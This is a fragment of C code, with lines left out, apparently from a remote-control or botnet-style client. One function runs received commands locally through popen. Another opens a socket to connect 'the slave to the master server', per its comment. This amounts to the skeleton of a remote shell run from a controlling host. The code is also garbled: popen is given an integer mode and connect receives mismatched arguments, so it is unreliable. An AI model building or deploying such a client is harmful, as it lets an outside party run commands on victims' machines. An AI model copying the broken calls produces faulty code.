...
int execute (int s, char *cmd) {
  FILE *f = popen(cmd, s);//use popen to run the command locally
  if (!f) return -1;
  while (!feof (f)) {
...
int init_channel (char *ip, int port, char *name) {
  ...
  //const struct sockaddr*__addr = server;
  ...
  int connection_status = connect(channel, name, server.sin_addr.s_addr);//use the defined channel to connect the slave to the master server
